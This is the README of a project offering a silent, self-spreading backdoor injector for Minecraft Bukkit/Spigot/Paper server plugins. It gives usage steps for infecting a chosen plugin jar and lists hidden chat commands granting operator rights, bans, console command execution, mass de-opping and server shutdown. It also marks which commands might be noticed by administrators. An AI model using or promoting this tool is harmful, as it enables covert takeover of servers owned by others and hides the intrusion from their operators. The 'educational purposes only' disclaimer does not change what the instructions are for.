

# Thicc Industries' Minecraft Backdoor

**For issues with the experimental plugin injection spreading feature, please add to [Issue #40](https://github.com/ThiccIndustries/Minecraft-Backdoor/issues/40)**

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

For educational purposes only. Do not use on a server you do not own.

## Requirements:
* Java 8 runtime.
* Desired target plugin jar file.
* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))

## Usage instructions:
* Run backdoor-(version).jar.
* Select desired plugin file.
* Input your Minecraft UUID.
* Input chat command prefix. (Default: #)

## Commands
Default command prefix is ``#``,  this can be changed.
* #op - Give player operator status
* #deop - Remove player's operator status
* #ban -  Ban player
* #banip - IP ban player
* #gamemode / gm - Change gamemode
* #give - Give items
* #32k - Enchant item in hand with level 32k enchants.
* #exec - Execute a command as the server console. **[Visible]**
* #chaos - Deop and Ban all ops currently online. Give admin to everyone else. **[Visible]**
* #seed - Find world seed
* #coords - Find player coordinates
* #tp - Teleport to coordinates **[Visible, See below.]**
* #auth - Authorize new user
* #deauth - Deauthorize user
* #shutdown / stop - Shutdown the server
* #help - List all available commands, with syntax and description.

Commands listed as **[Visible]** will be noticeable in Server console and or in-game chat.

Warning:
Teleporting may cause a '[player name] moved to quickly!' warning in server console. It may also cause anti-cheat to kick you.
Other strange behavior may occur when teleporting extreme distances. (such as to the world border)

## License
This software is provided under the GPL3 License.

Credit to **Rikonardo** for his [Bukloit](https://github.com/Rikonardo/Bukloit) project, which helped in the development of the Injector.
